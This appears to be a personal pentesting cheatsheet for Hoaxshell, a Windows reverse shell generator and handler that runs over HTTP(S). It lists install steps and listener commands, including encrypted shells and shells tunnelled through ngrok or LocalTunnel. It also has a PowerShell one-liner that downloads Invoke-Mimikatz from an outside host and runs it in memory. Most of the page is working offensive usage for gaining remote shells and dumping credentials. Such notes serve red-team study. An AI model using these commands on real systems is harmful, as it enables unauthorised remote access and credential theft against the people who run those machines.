# Hoaxshell

[Hoaxshell](https://github.com/t3l3machus/hoaxshell#constraint-language-mode-support) is a *.. Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell.*

#### Installation

```bash
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```

#### Considerations Limitations!

2023:
>*[The latest version of this project is the](https://github.com/t3l3machus/hoaxshell#-the-latest-version-of-this-project-is-the-hoaxshell-standalone-listener-which-comes-with-refreshed-payload-templates-wou-can-also-use-it-directly-from-httpsrevshellscom-make-sure-to-choose-hoaxshell-as-the-listener) [HoaxShell standalone listener](https://github.com/t3l3machus/hoaxshell/tree/main/revshells) which comes with refreshed payload templates. Wou can also use it directly from [https://revshells.com](https://revshells.com) (make sure to choose hoaxshell as the listener).*

*The shell is going to hang if you execute a command that initiates an interactive session* - no [[Mimikatz-Cheatsheet]], or any .exe or cmd.exe that starts an interactive session - but you can if you:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:4443/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"PRIVILEGE::Debug"'
```

Cheatsheet - currently just the usage from the README 
```bash
# Invoke-Expression (default)
sudo python3 hoaxshell.py -s <your_ip>
# Payload that writes and executes commands from a file
sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

# Recommended usage http header to transfer shell session info
sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

# Encrypted shell session (htttsp + self-signed certificate)
# Generate self-signed certificate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
# Pass the cert.pem and key.pem as arguments:
sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

# Encrypted shell session with a trusted certificate
sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
# Grab session mode
sudo python3 hoaxshell.py -s <your_ip> -g
# Constraint language mode support
sudo python3 hoaxshell.py -s <your_ip> -cm

# Shell session over https using tunneling tools - ngrok and localtunnel
# Use `-ng` or `--ngrok` for Ngrok server
sudo python3 hoaxshell.py -ng
# Use `-lt` or `--localtunnel` for LocalTunnel server
sudo python3 hoaxshell.py -lt

```
Recommended tunnelling tools: 
- [Ngrok](https://ngrok.com)
- [LocalTunnel](https://localtunnel.me)

## References

[Hoaxshell](https://github.com/t3l3machus/hoaxshell#constraint-language-mode-support) 
[Ngrok](https://ngrok.com)
[LocalTunnel](https://localtunnel.me)
